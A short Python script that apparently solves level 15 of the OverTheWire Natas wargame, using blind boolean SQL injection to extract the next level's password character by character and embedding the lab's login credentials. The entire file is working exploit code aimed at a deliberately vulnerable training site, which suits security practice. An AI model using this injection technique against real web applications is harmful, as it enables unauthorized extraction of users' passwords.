import requests
import string
from requests.auth import HTTPBasicAuth

requests.adapters.DEFAULT_RETRIES=100

ValidChars = string.digits + string.ascii_letters
PASSWORD_LEN = 32

password=''
count =1

username = 'natas16'

auth = HTTPBasicAuth('natas15', 'wherethepassword')
headers = {'Content-Type': 'application/x-www-form-urlencoded'}

url = "http://natas15.natas.labs.overthewire.org/index.php"

while count < PASSWORD_LEN +1:
    for c in ValidChars:
        payload=f"username={username}" + \
                "\" AND " + \
                "BINARY substring(password,1," + str(count) + ")" + \
                " = '" + password + c + "'" + \
                " -- "
        
        while True:
            try:
                response=requests.post(url, data=payload, headers=headers, auth=auth, verify=False)
                break
            except:
                continue
            
        if 'This user exists.' in response.text:
            print("Char has been found: " + c)
            password+=c
            count = count+1

print("The password is: " + password)